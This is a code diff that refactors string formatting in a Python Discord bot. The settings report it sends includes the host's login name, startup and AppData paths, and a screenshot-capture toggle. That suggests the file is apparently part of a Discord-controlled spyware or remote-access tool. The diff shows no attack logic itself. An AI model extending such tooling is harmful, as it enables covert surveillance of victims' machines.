@@ -93,11 +93,10 @@ id_fruits = [
 icon_url = "https://cdn.discordapp.com/emojis/{}.png?v=1".format(url_fruits[randint(0, len(url_fruits) - 1)])
 
 
-def default_settings():
-    global access_to_screen, screen_delay, lost_screen_delay
-    access_to_screen = True  # Разрешение на скрины
-    screen_delay = 100  # delay of pause
-    lost_screen_delay = screen_delay
+# default_settings
+access_to_screen = True  # Разрешение на скрины
+screen_delay = 100  # delay of pause
+lost_screen_delay = screen_delay
 
 
 class Discord:
@@ -211,29 +210,21 @@ class Discord:
     @staticmethod
     async def send_settings_form():
         await Discord.send_embed(description="```python\n"
-                                             "file_name: \"{file_name}\"\n"
-                                             "app_data: \"{app_data}\"\n"
-                                             "start_up: \"{start_up}\"\n"
-                                             "desktop: \"C:\\Users\\{login_name}\\Desktop\""
+                                             f"file_name: \"{file_name}\"\n"
+                                             f"app_data: \"{app_data}\"\n"
+                                             f"start_up: \"{start_up}\"\n"
+                                             f"desktop: \"C:\\Users\\{login_name}\\Desktop\""
                                              "```"
-                                             "```autohotkey\n"
-                                             "login: \"{login}\"\n"
-                                             "web_module_exist: {web_module_exist}\n"
-                                             "screen_module_exist: {screen_module_exist}\n"
-                                             "access_to_screen: {access_to_screen}\n"
-                                             "screen_delay: {screen_delay}\n"
-                                             "lost_screen_delay: {lost_screen_delay}\n"
+                                             f"```autohotkey\n"
+                                             f"login: \"{login}\"\n"
+                                             f"web_module_exist: {web_module_exist}\n"
+                                             f"screen_module_exist: {screen_module_exist}\n"
+                                             f"access_to_screen: {access_to_screen}\n"
+                                             f"screen_delay: {screen_delay}\n"
+                                             f"lost_screen_delay: {lost_screen_delay}\n"
                                              "```"
                                              ""
-                                             ""
-                                             "".format(login=login, file_name=file_name,
-                                                       access_to_screen=access_to_screen,
-                                                       web_module_exist=web_module_exist,
-                                                       screen_module_exist=screen_module_exist,
-                                                       login_name=login_name, app_data=app_data,
-                                                       path=file_name, start_up=start_up,
-                                                       lost_screen_delay=lost_screen_delay,
-                                                       screen_delay=screen_delay), status=False)
+                                             "", status=False)
 
     @staticmethod
     async def edit_embed(later_embed, description="", thumbnail="", image="", time=True, status=True):
